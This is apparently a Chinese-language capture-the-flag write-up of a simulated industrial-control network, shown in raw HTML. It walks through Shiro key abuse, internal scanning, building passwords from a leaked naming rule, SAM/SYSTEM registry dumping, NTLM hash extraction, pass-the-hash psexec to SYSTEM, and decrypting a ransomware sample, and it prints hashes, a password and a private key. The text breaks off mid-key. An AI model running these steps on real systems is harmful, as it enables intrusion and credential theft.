class="line">java.io.tmpdir = /tmp</span><br><span class="line">java.util.logging.FileHandler.formatter = java.util.logging.XMLFormatter</span><br><span class="line">java.util.logging.FileHandler.count = 1</span><br><span class="line">catalina.home = /tmp/tomcat.8080.2227855515484347988</span><br><span class="line">java.version = 1.8.0_392</span><br><span class="line">sun.cds.enableSharedLookupCache = false</span><br><span class="line">sun.security.krb5.maxReferrals = 5</span><br><span class="line">jdk.tls.keyLimits = AES/GCM/NoPadding KeyUpdate 2^37</span><br><span class="line">PID = 620</span><br><span class="line">java.vm.specification.name = Java Virtual Machine Specification</span><br><span class="line">java.awt.printerjob = sun.print.PSPrinterJob</span><br><span class="line">CONSOLE_LOG_CHARSET = UTF-8</span><br><span class="line">jdk.xml.dsig.secureValidationPolicy = disallowAlg http://www.w3.org/TR/1999/REC-xslt-19991116,disallowAlg http://www.w3.org/2001/04/xmldsig-more#rsa-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#hmac-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#md5,maxTransforms 5,maxReferences 30,disallowReferenceUriSchemes file http https,minKeySize RSA 1024,minKeySize DSA 1024,minKeySize EC 224,noDuplicateIds,noRetrievalMethodLoops</span><br><span class="line">catalina.base = /tmp/tomcat.8080.2227855515484347988</span><br><span class="line">java.library.path = /usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib</span><br><span class="line">java.util.logging.FileHandler.limit = 50000</span><br><span class="line">java.vm.info = mixed mode, sharing</span><br><span class="line">java.vendor = Private Build</span><br><span class="line">keystore.type = jks</span><br><span class="line">java.specification.maintenance.version = 5</span><br><span class="line">handlers = java.util.logging.ConsoleHandler</span><br><span class="line">sun.io.unicode.encoding = UnicodeLittle</span><br><span class="line">java.ext.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/ext</span><br><span class="line">policy.expandProperties = true</span><br><span class="line">securerandom.strongAlgorithms = NativePRNGBlocking:SUN</span><br><span class="line">krb5.kdc.bad.policy = tryLast</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">ProcessEnvironment</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">OSS</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">UserPassSearcher</span><br><span class="line">-------------</span><br><span class="line">org.apache.shiro.web.filter.authc.FormAuthenticationFilter:</span><br><span class="line">[failureKeyAttribute = shiroLoginFailure, loginUrl = /login, successUrl = /, usernameParam = username, passwordParam = password]</span><br><span class="line"></span><br><span class="line">org.apache.catalina.startup.Tomcat:</span><br><span class="line">[hostname = localhost]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">CookieThief</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">AuthThief</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br></pre></td></tr></table></figure>

<p>有用的是这里，存在一个shirokey，然后shiro一把梭，注入内存马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">===========================================</span><br><span class="line">CookieRememberMeManager(ShiroKey)</span><br><span class="line">-------------</span><br><span class="line">algMode = CBC, key = QZYysgMYhG6/CzIJlVpR2g==, algName = AES</span><br></pre></td></tr></table></figure>

<p>flag01在根目录</p>
<h1 id="FLAG02"><a href="#FLAG02" class="headerlink" title="FLAG02"></a>FLAG02</h1><p>写一个公钥进去，ssh连接，上传一个fscan再做一个代理</p>
<p>fscan扫一下内网</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">root@security:~# ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="line">    link/ether 00:16:3e:2f:44:6e brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.22.17.213/16 brd 172.22.255.255 scope global dynamic eth0</span><br><span class="line">       valid_lft 315359102sec preferred_lft 315359102sec</span><br><span class="line">    inet6 fe80::216:3eff:fe2f:446e/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">root@security:~# ./fscan2 -h 172.22.17.213/24</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-05-02 11:23:19] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-05-02 11:23:19] [INFO] 开始信息扫描</span><br><span class="line">[2025-05-02 11:23:19] [INFO] CIDR范围: 172.22.17.0-172.22.17.255</span><br><span class="line">[2025-05-02 11:23:20] [INFO] 生成IP范围: 172.22.17.0.%!d(string=172.22.17.255) - %!s(MISSING).%!d(MISSING)</span><br><span class="line">[2025-05-02 11:23:20] [INFO] 解析CIDR 172.22.17.213/24 -&gt; IP范围 172.22.17.0-172.22.17.255</span><br><span class="line">[2025-05-02 11:23:20] [INFO] 最终有效主机数量: 256</span><br><span class="line">[2025-05-02 11:23:20] [INFO] 开始主机扫描</span><br><span class="line">[2025-05-02 11:23:20] [SUCCESS] 目标 172.22.17.6     存活 (ICMP)</span><br><span class="line">[2025-05-02 11:23:20] [SUCCESS] 目标 172.22.17.213   存活 (ICMP)</span><br><span class="line">[2025-05-02 11:23:23] [INFO] 存活主机数量: 2</span><br><span class="line">[2025-05-02 11:23:23] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.6:445</span><br><span class="line">[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.6:139</span><br><span class="line">[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.6:135</span><br><span class="line">[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.6:21</span><br><span class="line">[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.6:80</span><br><span class="line">[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.213:22</span><br><span class="line">[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.213:8080</span><br><span class="line">[2025-05-02 11:23:23] [SUCCESS] 服务识别 172.22.17.6:21 =&gt; [ftp] 产品:Microsoft ftpd 系统:Windows Banner:[220 Microsoft FTP Service.]</span><br><span class="line">[2025-05-02 11:23:23] [SUCCESS] 服务识别 172.22.17.213:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]</span><br><span class="line">[2025-05-02 11:23:28] [SUCCESS] 服务识别 172.22.17.6:445 =&gt;</span><br><span class="line">[2025-05-02 11:23:28] [SUCCESS] 服务识别 172.22.17.6:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-05-02 11:23:28] [SUCCESS] 服务识别 172.22.17.213:8080 =&gt; [http]</span><br><span class="line">[2025-05-02 11:23:28] [SUCCESS] 服务识别 172.22.17.6:80 =&gt; [http]</span><br><span class="line">[2025-05-02 11:24:28] [SUCCESS] 服务识别 172.22.17.6:135 =&gt;</span><br><span class="line">[2025-05-02 11:24:28] [INFO] 存活端口数量: 7</span><br><span class="line">[2025-05-02 11:24:28] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-05-02 11:24:28] [INFO] 加载的插件: findnet, ftp, ms17010, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle</span><br><span class="line">[2025-05-02 11:24:28] [SUCCESS] 网站标题 http://172.22.17.6        状态码:200 长度:661    标题:172.22.17.6 - /</span><br><span class="line">[2025-05-02 11:24:28] [SUCCESS] NetBios 172.22.17.6     WORKGROUP\WIN-ENGINEER</span><br><span class="line">[2025-05-02 11:24:28] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.17.6</span><br><span class="line">主机名: WIN-ENGINEER</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.17.6</span><br><span class="line">[2025-05-02 11:24:28] [SUCCESS] 网站标题 http://172.22.17.213:8080 状态码:302 长度:0      标题:无标题 重定向地址: http://172.22.17.213:8080/login;jsessionid=AE53E4C807EB6DEB9B204E7B4201FDFF</span><br><span class="line">[2025-05-02 11:24:28] [SUCCESS] 匿名登录成功!</span><br><span class="line">[2025-05-02 11:24:28] [SUCCESS] 网站标题 http://172.22.17.213:8080/login;jsessionid=AE53E4C807EB6DEB9B204E7B4201FDFF 状 态码:200 长度:2936   标题:火创能源监控画面管理平台</span><br><span class="line">[2025-05-02 11:24:29] [SUCCESS] 目标: http://172.22.17.213:8080</span><br><span class="line">  漏洞类型: poc-yaml-spring-actuator-heapdump-file</span><br><span class="line">  漏洞名称:</span><br><span class="line">  详细信息:</span><br><span class="line">        author:AgeloVito</span><br><span class="line">        links:https://www.cnblogs.com/wyb628/p/8567610.html</span><br><span class="line">[2025-05-02 11:24:30] [SUCCESS] 目标: http://172.22.17.213:8080</span><br><span class="line">  漏洞类型: poc-yaml-springboot-env-unauth</span><br><span class="line">  漏洞名称: spring2</span><br><span class="line">  详细信息:</span><br><span class="line">        links:https://github.com/LandGrey/SpringBootVulExploit</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.6:445</span><br><span class="line">[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.6:139</span><br><span class="line">[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.6:135</span><br><span class="line">[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.6:21</span><br><span class="line">[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.6:80</span><br></pre></td></tr></table></figure>

<p>先看ftp，可以匿名登陆但是中文会乱码，和80端口的文件是一样的，随便在一个服务下载就行</p>
<p>内部通知.docx告诉我们了密码规则</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">登陆账户设置：</span><br><span class="line">   为方便管理和标准化，登陆账户名将采用姓名全称的小写拼音形式。例如，张三的账户名为zhangsan，工号为0801。初始密码将由账户名+@+工号组成，例如，zhangsan@0801。</span><br></pre></td></tr></table></figure>

<p>还存在一个通讯录，根据通讯录里的信息和这个密码规则可以构造，有好多账号都可以登陆，任意一个就可以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chenhua/chenhua@0813</span><br></pre></td></tr></table></figure>

<p>rdp连接，scad.txt还给了一个管理员的密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WIN-SCADA: 172.22.26.xx</span><br><span class="line">Username: Administrator</span><br><span class="line">Password: IYnT3GyCiy3</span><br></pre></td></tr></table></figure>

<p>但是这不是这台主机的管理员密码，题目提示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">关卡剧情：</span><br><span class="line">尝试接管 SCADA 工程师的个人 PC，并通过滥用 Windows 特权组提升至系统权限。</span><br></pre></td></tr></table></figure>

<p>查看当前用户组</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\chenhua&gt;net user chenhua</span><br><span class="line">用户名                 chenhua</span><br><span class="line">全名</span><br><span class="line">注释</span><br><span class="line">用户的注释</span><br><span class="line">国家/地区代码          000 (系统默认值)</span><br><span class="line">帐户启用               Yes</span><br><span class="line">帐户到期               从不</span><br><span class="line"></span><br><span class="line">上次设置密码           2023/12/26 0:47:03</span><br><span class="line">密码到期               从不</span><br><span class="line">密码可更改             2023/12/26 0:47:03</span><br><span class="line">需要密码               Yes</span><br><span class="line">用户可以更改密码       Yes</span><br><span class="line"></span><br><span class="line">允许的工作站           All</span><br><span class="line">登录脚本</span><br><span class="line">用户配置文件</span><br><span class="line">主目录</span><br><span class="line">上次登录               2025/5/2 11:36:30</span><br><span class="line"></span><br><span class="line">可允许的登录小时数     All</span><br><span class="line"></span><br><span class="line">本地组成员             *Backup Operators     *Remote Desktop Users</span><br><span class="line">                       *Users</span><br><span class="line">全局组成员             *None</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们在<code>Backup Operators</code>组内，但是没给用户分配SeBackup特权，可以用注册表 SAM 转储提权，直接转储 sam 和 system </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS C:\users\chenhua\Desktop&gt; reg save hklm\sam sam.hive</span><br><span class="line">操作成功完成。</span><br><span class="line">PS C:\users\chenhua\Desktop&gt; reg save hklm\system system.hive</span><br><span class="line">操作成功完成。</span><br></pre></td></tr></table></figure>

<p>然后用secretsdump导出hash</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:f82292b7ac79b05d5b0e3d302bd0d279:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:a2fa2853651307ab9936cc95c0e0acf5:::</span><br><span class="line">chentao:1000:aad3b435b51404eeaad3b435b51404ee:47466010c82da0b75328192959da3658:::</span><br><span class="line">zhaoli:1001:aad3b435b51404eeaad3b435b51404ee:2b83822caab67ef07b614d05fd72e215:::</span><br><span class="line">wangning:1002:aad3b435b51404eeaad3b435b51404ee:3c52d89c176321511ec686d6c05770e3:::</span><br><span class="line">zhangling:1003:aad3b435b51404eeaad3b435b51404ee:8349a4c5dd1bdcbc5a14333dd13d9f81:::</span><br><span class="line">zhangying:1004:aad3b435b51404eeaad3b435b51404ee:8497fa5480a163cb7817f23a8525be7d:::</span><br><span class="line">lilong:1005:aad3b435b51404eeaad3b435b51404ee:c3612c48cf829d1149f7a4e3ef4acb8a:::</span><br><span class="line">liyumei:1006:aad3b435b51404eeaad3b435b51404ee:63ddcde0fa219c75e48e2cba6ea8c471:::</span><br><span class="line">wangzhiqiang:1007:aad3b435b51404eeaad3b435b51404ee:5a661f54da156dc93a5b546ea143ea07:::</span><br><span class="line">zhouyong:1008:aad3b435b51404eeaad3b435b51404ee:5d49bf647380720b9f6a15dbc3ffe432:::</span><br><span class="line">chenhua:1009:aad3b435b51404eeaad3b435b51404ee:07ff24422b538b97f3c297cc8ddc7615:::</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp/tmp]</span><br><span class="line">└─# impacket-psexec  -hashes aad3b435b51404eeaad3b435b51404ee:f82292b7ac79b05d5b0e3d302bd0d279 Administrator@172.22.17.6</span><br><span class="line"></span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Requesting shares on 172.22.17.6.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file odkqcbIH.exe</span><br><span class="line">[*] Opening SVCManager on 172.22.17.6.....</span><br><span class="line">[*] Creating service CFcL on 172.22.17.6.....</span><br><span class="line">[*] Starting service CFcL.....</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">[-] Decoding error detected, consider running chcp.com at the target,</span><br><span class="line">map the result with https://docs.python.org/3/library/codecs.html#standard-encodings</span><br><span class="line">and then execute smbexec.py again with -codec and the corresponding codec</span><br><span class="line">Microsoft Windows [�汾 10.0.20348.2113]</span><br><span class="line"></span><br><span class="line">[-] Decoding error detected, consider running chcp.com at the target,</span><br><span class="line">map the result with https://docs.python.org/3/library/codecs.html#standard-encodings</span><br><span class="line">and then execute smbexec.py again with -codec and the corresponding codec</span><br><span class="line">(c) Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; type C:\Users\Administrator\flag\flag02.txt</span><br></pre></td></tr></table></figure>

<h1 id="FLAG03"><a href="#FLAG03" class="headerlink" title="FLAG03"></a>FLAG03</h1><p>之前给的排上用场了，用fscan扫一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WIN-SCADA: 172.22.26.xx</span><br><span class="line">Username: Administrator</span><br><span class="line">Password: IYnT3GyCiy3</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@security:~# ./fscan2 -h 172.22.26.1/24</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-05-02 12:42:59] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-05-02 12:42:59] [INFO] 开始信息扫描</span><br><span class="line">[2025-05-02 12:42:59] [INFO] CIDR范围: 172.22.26.0-172.22.26.255</span><br><span class="line">[2025-05-02 12:42:59] [INFO] 生成IP范围: 172.22.26.0.%!d(string=172.22.26.255) - %!s(MISSING).%!d(MISSING)</span><br><span class="line">[2025-05-02 12:42:59] [INFO] 解析CIDR 172.22.26.1/24 -&gt; IP范围 172.22.26.0-172.22.26.255</span><br><span class="line">[2025-05-02 12:42:59] [INFO] 最终有效主机数量: 256</span><br><span class="line">[2025-05-02 12:42:59] [INFO] 开始主机扫描</span><br><span class="line">[2025-05-02 12:42:59] [SUCCESS] 目标 172.22.26.11    存活 (ICMP)</span><br><span class="line">[2025-05-02 12:43:02] [INFO] 存活主机数量: 1</span><br><span class="line">[2025-05-02 12:43:02] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-05-02 12:43:02] [SUCCESS] 端口开放 172.22.26.11:135</span><br><span class="line">[2025-05-02 12:43:02] [SUCCESS] 端口开放 172.22.26.11:139</span><br><span class="line">[2025-05-02 12:43:02] [SUCCESS] 端口开放 172.22.26.11:80</span><br><span class="line">[2025-05-02 12:43:02] [SUCCESS] 端口开放 172.22.26.11:1433</span><br><span class="line">[2025-05-02 12:43:02] [SUCCESS] 端口开放 172.22.26.11:445</span><br><span class="line">[2025-05-02 12:43:07] [SUCCESS] 服务识别 172.22.26.11:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-05-02 12:43:07] [SUCCESS] 服务识别 172.22.26.11:1433 =&gt; [ms-sql-s] 版本:13.00.4001; SP1 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.]</span><br><span class="line">[2025-05-02 12:43:07] [SUCCESS] 服务识别 172.22.26.11:445 =&gt;</span><br><span class="line">[2025-05-02 12:43:08] [SUCCESS] 服务识别 172.22.26.11:80 =&gt; [http]</span><br></pre></td></tr></table></figure>

<p>远程桌面连接，登陆后会自动启动软件，然后开启锅炉得到flag</p>
<h1 id="FLAG04"><a href="#FLAG04" class="headerlink" title="FLAG04"></a>FLAG04</h1><p>桌面上有一个解密你的文件.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">** 您的文件已被加密 **</span><br><span class="line"></span><br><span class="line">很抱歉，您的计算机中的文件已被加密。要解锁您的文件，您需要支付赎金。</span><br><span class="line"></span><br><span class="line">-----------------------------------------</span><br><span class="line">| 注意事项                               |</span><br><span class="line">-----------------------------------------</span><br><span class="line">| 1. 不要试图删除或修改加密文件。        |</span><br><span class="line">| 2. 支付赎金前，不要尝试恢复文件。      |</span><br><span class="line">| 3. 请在规定时间内支付赎金。            |</span><br><span class="line">-----------------------------------------</span><br><span class="line"></span><br><span class="line">要获取解密密钥和进一步的说明，请访问我们的支付网站：</span><br><span class="line">[支付网站链接]</span><br><span class="line"></span><br><span class="line">如果无法访问支付网站，请通过电子邮件联系我们：</span><br><span class="line">contact@ransomware.com</span><br><span class="line"></span><br><span class="line">赎金金额：2比特币</span><br><span class="line"></span><br><span class="line">-----------------------------------------</span><br><span class="line">| 警告：尝试恢复文件或报警将导致永久丢失文件。|</span><br><span class="line">-----------------------------------------</span><br><span class="line"></span><br><span class="line">比特币支付地址：1ABcDefGhijxLxnxpxrsxUvwxYZabcdEf</span><br></pre></td></tr></table></figure>

<p>桌面上还给了两个.lock文件，附件还给了两个key，c盘还有一个Lockyou.exe</p>
<p>用dnSpy反编译可以看到加密逻辑根据 locky 勒索软件家族加解密逻辑和 .NET 逆向代码，解密思路如下：</p>
<ul>
<li><p>首先用 <code>privateKey</code> 对加密的 <code>encryptedAesKey</code>进行 RSA 解密，得到 <code>AES_KEY</code>。</p>
</li>
<li><p>再用 <code>AES_KEY</code> 对加密的文件 <code>ScadaDB.sql.locky</code> 解密，得到 <code>ScadaDB.sql</code></p>
<p>通过<a target="_blank" rel="noopener" href="https://www.ssleye.com/ssltool/pem_xml.html">工具</a>，将 <code>privateKey</code> 从 XML 格式转换为 PEM 格式，得到 <code>PRIVATE_KEY</code>：</p>
</li>
</ul>
<p>通过<a target="_blank" rel="noopener" href="https://www.ssleye.com/ssltool/pem_xml.html">工具</a>，将 <code>privateKey</code> 从 XML 格式转换为 PEM 格式，得到 <code>PRIVATE_KEY</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PRIVATE KEY-----</span><br><span class="line">MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALqC9ggGlbTFae2+</span><br><span class="line">PyH3HsdgK7brtrb7QTtuSXTMAJ3ruoBDwq0Lw8rMHm3IQNS51d3vjiVeZB8RU6f3</span><br><span class="line">YiM0p5p4VJn2Y2K7IWUixptX08HEay+mGFbH1WRv+FC0g1EXwIocjdRyCz/1qgqr</span><br><span class="line">rtaFqNAncaMDLGaTAz6Hasx3BQsRAgMBAAECgYEAtuLJ687BJ5RYraZac6zFQo17</span><br><span class="line">8A8siDrRmTwozV1o0XGf3DwVfefGYmpLAC1X3QAoxUosoVnwZUJxPIfodEsieDox</span><br><span class="line">RqVxMCcKbJK3nwMdAKov6BpxGUloALlxTi6OImT6w/roTW9OK6vlF54o5U/4DnQN</span><br><span class="line">UM6ss/2/CMM/EgM9vz0CQQDZE+pqh9wn+mEindAUITKLSSPQVlFCaZaaICaD8LQz</span><br><span class="line">J5fbnmZ6PwiyDS/Cz080/dEsuPbk7Wlsgn5+rBZ9QSYXAkEA2/QGgIpqpxODaJLQ</span><br><span class="line">vjS8xnU8NvxMlk110LSUnfAh/E6wB/XUc89HhWMqh4sGo/LAX0n94dcZ4vLMpzbk</span><br><span class="line">Vfy5FwJBALpSudaOno1B/7XytvNQO04KjU75h+31K2tHRUfihwmRZmr/Xv52tEP/</span><br><span class="line">xYr03guiALTeXizJCsA0kdawZu1DyikCQDztieeNcCG77AjJsn0dyrUGwJlSpjx0</span><br><span 